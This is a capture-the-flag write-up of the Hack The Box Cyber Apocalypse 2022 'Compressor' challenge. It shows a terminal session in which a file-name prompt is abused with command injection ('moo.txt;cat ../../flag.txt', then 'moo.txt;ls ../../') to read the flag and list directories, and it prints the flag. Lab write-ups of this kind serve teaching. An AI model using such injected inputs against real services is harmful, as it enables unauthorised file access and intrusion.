---
title: HTB-CA22-misc-compressor
date: "2022-05-19"
description: misc challenge during Cyber Apocalypse 2022
tldr: bash, command injection
tags: [htb,hackthebox,ca22,cyber-apocalypse22,misc,command-injection,bash]
---

## Backstory
Each challenge had a story tied to it, for this challenge it was:   

Ramona's obsession with modifications and the addition of artifacts to her body has slowed her down and made her fail and almost get killed in many missions.  
For this reason, she decided to hack a tiny robot under Golden Fang's ownership called "Compressor", which can reduce and increase the volume of any object to minimize/maximize it according to the needs of the mission.  
With this item, she will be able to carry any spare part she needs without adding extra weight to her back, making her fast. Can you help her take it and hack it?

  
Connect to the docker container:   
```shell
$ nc 138.68.183.104 30830  
  
[*] Directory to work in: aa0pcXBBf0oCdU03wGyse2tpkw0DOnWJ  
  
Component List:  
  
+===============+  
| |  
| 1. Head 🤖 |  
| 2. Torso 🦴 |  
| 3. Hands 💪 |  
| 4. Legs 🦵 |  
| |  
+===============+  
  
[*] Choose component: 2  
  
[*] Sub-directory to work in: aa0pcXBBf0oCdU03wGyse2tpkw0DOnWJ/Torso  
  
  
Actions:  
  
1. Create artifact  
2. List directory (pwd; ls -la)  
3. Read artifact (cat ./<name>)  
4. Compress artifact (zip <name>.zip <name> <options>)  
5. Change directory (cd <dirname>)  
6. Clean directory (rm -rf ./*)  
7. Exit  
  
[*] Choose action: 3  
  
  
Insert name you want to read: moo.txt;cat ../../flag.txt  
cat: can't open './moo.txt': No such file or directory  
HTB{GTFO_4nd_m4k3_th3_b35t_4rt1f4ct5}  
```  
  
using the same “bypass” we could list the contents of the other folders:  

```shell
[*] Choose action: 3  
  
  
Insert name you want to read: moo.txt;ls ../../  
cat: can't open './moo.txt': No such file or directory  
9mHpXSlddjlAy00Zzd2SxdV6hzrXrQPC  
LE4HMvwMattVKdxsCY1llpYllDw89HhT  
MkKWwKg7dVr1YJaLslhoVUKlk4ST2SgS  
aX8xStlHbzrr8tIuEs41V6szNF55yoln  
aa0pcXBBf0oCdU03wGyse2tpkw0DOnWJ  
artifacts.py  
clear.py  
flag.txt  
iXrOMWiQgUsKq2ZQxlMOxq1hxkeRqBTi  
oqtoWjbz3pDT0k7IrDOMUCCIVhQgCna1  
zrNFtkZa90Sfw2FdN8FunoM1qjrBkoT0
```

Flag: `HTB{GTFO_4nd_m4k3_th3_b35t_4rt1f4ct5}`